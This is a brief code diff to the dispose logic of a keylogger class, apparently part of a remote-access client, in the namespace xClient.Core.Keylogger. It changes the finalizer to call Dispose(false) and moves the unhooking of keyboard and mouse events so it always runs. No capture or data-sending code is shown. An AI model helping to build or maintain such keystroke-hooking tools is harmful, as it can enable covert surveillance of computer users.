@@ -61,7 +61,7 @@ namespace xClient.Core.Keylogger
             // It is a safe-guard because we want to make sure we unsubscribe from these
             // things or the client may not be able to get keystrokes/mouse clicks to any
             // other application (including Windows).
-            Dispose(true);
+            Dispose(false);
         }
 
         public void Dispose()
@@ -82,10 +82,10 @@ namespace xClient.Core.Keylogger
                         _timerFlush.Dispose();
                     }
 
-                    Unsubscribe();
-
                     disposed = true;
                 }
+
+                Unsubscribe();
             }
         }
 
